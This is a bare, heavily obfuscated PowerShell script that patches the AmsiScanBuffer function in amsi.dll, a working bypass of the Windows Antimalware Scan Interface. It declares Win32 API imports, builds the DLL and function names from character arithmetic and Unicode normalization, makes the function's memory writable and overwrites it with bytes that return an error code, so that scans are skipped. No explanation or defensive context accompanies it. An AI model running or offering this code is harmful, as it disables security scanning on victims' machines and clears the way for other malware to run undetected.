$HgtNmkbH6rf3Grg = @"
using System;
using System.Runtime.InteropServices;
public class HgtNmkbH6rf3Grg {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr IQEXpU1Ax, string IJu2K1cZ8VI);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr pWq6BGhfY, UIntPtr A3ZIm, uint cHmt7bbKNpcvYN52Xxb, out uint DAKyMSOni4);
}
"@

Add-Type $HgtNmkbH6rf3Grg

$G3HxIoXi = [HgtNmkbH6rf3Grg]::LoadLibrary("$([Char](97*65/65)+[cHar](109)+[CHar](26+89)+[ChAr](105)+[cHAR]([ByTE]0x2e)+[chAR]([BYtE]0x64)+[ChaR]([BYtE]0x6c)+[ChAR](51+57))")
$dHTuG3pz3L8yfVQBeMa = [HgtNmkbH6rf3Grg]::GetProcAddress($G3HxIoXi, "$(('ÃmsîScánBúff'+'êr').NOrmALizE([chaR](32+38)+[ChAR](14+97)+[CHAr]([bytE]0x72)+[CHAr]([byTE]0x6d)+[chAR](68*30/30)) -replace [ChaR]([bYtE]0x5c)+[cHAR](112+10-10)+[cHAR](123*61/61)+[CHAR](77+35-35)+[Char]([bYtE]0x6e)+[chaR](125*119/119))")
$p = 0
[HgtNmkbH6rf3Grg]::VirtualProtect($dHTuG3pz3L8yfVQBeMa, [uint32]5, 0x40, [ref]$p)
$QbYIo278T1u = "0xB8"
$R8aq = "0x57"
$LCN9jQ = "0x00"
$BNS4mflF2 = "0x07"
$IbPL093o0Hpjt = "0x80"
$RcS5D3oU_IfwBbCtq = "0xC3"
$UMmzBYcx = [Byte[]] ($QbYIo278T1u,$R8aq,$LCN9jQ,$BNS4mflF2,+$IbPL093o0Hpjt,+$RcS5D3oU_IfwBbCtq)
[System.Runtime.InteropServices.Marshal]::Copy($UMmzBYcx, 0, $dHTuG3pz3L8yfVQBeMa, 6)